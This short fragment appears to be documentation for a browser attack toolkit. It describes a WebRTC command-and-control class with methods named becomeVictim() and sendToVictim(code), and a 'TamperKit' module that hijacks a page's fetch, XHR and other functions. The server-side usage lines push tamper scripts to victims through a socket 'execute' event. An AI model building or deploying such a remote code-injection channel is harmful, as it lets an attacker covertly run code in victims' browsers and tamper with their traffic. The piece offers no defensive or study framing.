Clean separated code

Module

What it does

WebRTCC2 class              Clean API: becomeRelay(), becomeVictim(), sendToVictim(code), isConnected(), destroy()

TamperKit                     Modular hijacks: hijackAdd(), hijackFetch(), hijackXHR(), runAll(), restore()



Usage from server

// Send tamper script then activate
socket.emit('execute', `
  // Load TamperKit (if not already in page)
  TamperKit.hijackAdd(100);
`);

// Or full suite
socket.emit('execute', 'TamperKit.runAll()');
